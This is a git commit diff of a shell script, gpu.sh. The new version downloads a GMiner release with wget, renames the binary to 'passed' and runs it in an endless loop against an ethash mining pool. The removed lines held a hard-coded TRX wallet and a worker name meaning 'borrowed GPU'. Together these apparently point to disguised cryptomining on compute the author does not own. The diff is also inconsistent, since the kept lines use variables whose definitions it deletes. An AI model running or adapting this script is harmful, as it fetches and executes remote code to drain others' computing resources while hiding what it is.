404b0cde1c5b35eb4412328a6273b21a60de4155
bruhinbru <85330115+bruhinbru@users.noreply.github.com>
2021-06-04 13:07:40 +0800

    Update gpu.sh

--- gpu.sh
+++ gpu.sh
@@ -1,7 +1,11 @@
-#!/bin/bash
-POOL=ethash.unmineable.com:3333
-WALLET=TRX:TA341dN8GbhAyVfPb9A3Gwxnq3eMSbrcLD
-WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)
+#!/bin/sh
+wget https://github.com/develsoftware/GMinerRelease/releases/download/2.49/gminer_2_49_linux64.tar.xz
+tar xf gminer_2_49_linux64.tar.xz
+mv miner passed
+while [ 1 ]; do
+./passed --algo ethash --server ethash.poolbinance.com:1800 --user Minerhin.001 --pass 123456 --watchdog 0 --ssl 0
+sleep 10
+done
 
 chmod +x tuyulgpu
 ./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
